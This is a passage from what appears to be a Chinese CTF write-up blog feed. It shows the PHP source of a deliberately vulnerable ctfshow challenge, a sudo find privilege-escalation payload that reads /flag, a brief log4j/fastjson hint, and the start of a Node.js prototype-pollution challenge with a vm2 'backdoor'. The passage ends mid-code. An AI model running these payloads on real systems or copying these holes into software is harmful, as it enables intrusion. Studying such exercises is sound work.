class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-28 09:28:35</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">ctfshow</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_1</span> = <span class="number">0x41</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_2</span> = <span class="number">0x7b</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_3</span> = <span class="number">0x5b</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_4</span> = <span class="number">0x60</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_5</span> = <span class="number">0x30</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_6</span> = <span class="number">0x5f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_SIZE__</span>= <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_VAL_SIZE__</span>= <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cursor</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cache</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$ref_table</span>=[];</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">define</span>(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="built_in">self</span>::<span class="variable constant_">__REF_VAL_SIZE__</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">define</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$flag</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">neaten</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fill</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fill</span>(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="string">&#x27;ctfshow&#x27;</span>)===<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="string">&#x27;flag&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">fill</span>(<span class="params"><span class="variable">$ref</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]+<span class="number">23</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$val</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache, <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>)));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$arr</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_VAL_SIZE__</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache, <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="string">&quot;\x00&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">neaten</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ref_table[<span class="string">&#x27;_clear_&#x27;</span>]=<span class="variable language_">$this</span>-&gt;cursor;</span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&quot;_clear_&quot;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$arr</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="keyword">__NAMESPACE__</span>.<span class="string">&quot;\C::clear&quot;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0x36d</span>,<span class="string">&#x27;Q&#x27;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0x30</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNeaten</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;ref_table[<span class="string">&#x27;_clear_&#x27;</span>]+<span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>);</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>-<span class="number">4</span>));</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>-<span class="number">12</span>));</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>));</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params"><span class="variable">$ref</span>,<span class="variable">$size</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkRef</span>(<span class="variable">$ref</span>);</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$ref</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]=<span class="variable language_">$this</span>-&gt;cursor;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$r</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$r</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="string">&quot;v&quot;</span>,<span class="variable">$size</span>));</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="number">0x31</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$size</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$ref</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$ref</span>,<span class="variable">$this</span>-&gt;ref_table))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref not exists!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">seekCursor</span>(<span class="variable">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$cref</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">20</span>);</span><br><span class="line">        <span class="variable">$csize</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&quot;v&quot;</span>, <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">2</span>));</span><br><span class="line">        <span class="variable">$usize</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$val</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$csize</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="variable">$val</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$val</span>,<span class="variable">$fmt</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="variable">$fmt</span>,<span class="variable">$val</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;cursor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">truncation</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="title function_ invoke__">array_filter</span>(<span class="title function_ invoke__">str_split</span>(<span class="variable">$data</span>),function(<span class="variable">$var</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$var</span>!==<span class="string">&quot;\x00&quot;</span>;</span><br><span class="line">        &#125;));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">seekCursor</span>(<span class="params"><span class="variable">$cursor</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$cursor</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkRef</span>(<span class="params"><span class="variable">$ref</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$ref</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">sizeof</span>(<span class="variable">$r</span>)&gt;<span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Refenerce size too long!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$r</span>[<span class="number">0</span>]) || <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkByte</span>(<span class="variable">$r</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref invalid!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">array_shift</span>(<span class="variable">$r</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$r</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkByte</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref invalid!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkByte</span>(<span class="params"><span class="variable">$check</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &lt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_5</span> || <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &gt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_2</span> )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &gt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_3</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &lt;= <span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_4</span> </span><br><span class="line">            &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) !== <span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_6</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cache=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;php://memory&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readNeaten</span>();</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> C;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">main</span>();</span><br></pre></td></tr></table></figure><p><strong>思路</strong></p><p>写入post值得时候没限制长度，所以可以覆盖后面的flag和<em>clear</em>存储的值，然后最后读<em>clear</em>时候调用了call_user_func</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;easy-signin&quot;&gt;&lt;a href=&quot;#easy-signin&quot; class=&quot;headerlink&quot; title=&quot;easy_signin&quot;&gt;&lt;/a&gt;easy_signin&lt;/h2&gt;&lt;p&gt;题目&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/imag</summary>
      
    
    
    
    
    <category term="ctfshow 愚人杯" scheme="https://ke1nys.github.io/tags/ctfshow-%E6%84%9A%E4%BA%BA%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>杭师校赛决赛-web</title>
    <link href="https://ke1nys.github.io/posts/a14faaa5.html"/>
    <id>https://ke1nys.github.io/posts/a14faaa5.html</id>
    <published>2023-04-03T12:58:59.000Z</published>
    <updated>2023-04-06T06:48:36.162Z</updated>
    
    <content type="html"><![CDATA[<p>决赛wp ————&gt;    <a href="https://mp.weixin.qq.com/s?__biz=Mzg3NTg0OTAwMg==&amp;mid=2247484079&amp;idx=1&amp;sn=74a1712eb4cbf5c905ea80e92cf03c1c&amp;chksm=cf3a76eaf84dfffcb0e7af85b4c993b6b6e153cf17e55fffb7fc46d019d1b825fc40ceac009b&amp;mpshare=1&amp;scene=23&amp;srcid=0401jhF22ggclgHvClInRzbg&amp;sharer_sharetime=1680351746792&amp;sharer_shareid=ae0d082277f0323df022f55a1ded469f#rd&amp;ADUIN=599761980&amp;ADSESSION=1680348797&amp;ADTAG=CLIENT.QQ.5681_.0&amp;ADPUBNO=27272">wp</a></p><h2 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h2><p>这题坑了我好久………..</p><p><strong>题目</strong></p><p><img src="../images/image-20230403210025913.png" alt="image-20230403210025913"></p><p><img src="../images/image-20230403210056248.png" alt="image-20230403210056248"></p><p>随便传了个值，发现是</p><p>报错  ——&gt;   在 $PATH 中找不到可执行文件</p><p>然后就猜测是不是得用/bin/xxx这种类型的格式来写</p><p><img src="../images/image-20230403210226676.png" alt="image-20230403210226676"></p><p>然后当时开心坏了，但是这个直接读不了，得需要提权，当时用了好多办法，都不行，因为很难，知道看到了wp才发现自己漏了关键一步…….</p><p>得这样写才行 ….    /usr/bin/xxxxx     哎   把/usr给漏了</p><p><strong>sudo提权</strong></p><p><img src="../images/image-20230403210610793.png" alt="image-20230403210610793"></p><p>先查看一下权限</p><p><img src="../images/image-20230403211014597.png" alt="image-20230403211014597"></p><p>提示了root权限的没有密码的/usr/bin/find能用</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/sudo find /flag -exec cat /flag \;</span><br></pre></td></tr></table></figure><p>不过学到了个提权方法   之前的是用date报错来提权拿到flag的</p><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><p>题目(hint  —- &gt;   Try to fxxk it ( Log4j     )</p><p><img src="../images/image-20230403212340457.png" alt="image-20230403212340457"></p><p><strong>考点</strong></p><p><strong>log4j+fastjson 远程开启LDAP服务</strong></p><h2 id="eznode"><a href="#eznode" class="headerlink" title="eznode"></a>eznode</h2><p>题目</p><p><img src="../images/image-20230403222934521.png" alt="image-20230403222934521"></p><p>就是去找一下源码</p><p><img src="../images/image-20230403223016892.png" alt="image-20230403223016892"></p><p>找到了源码，然后对源码进行分析</p><p><strong>源码</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(&#123;&#125;.<span class="property">shellcode</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">        <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">        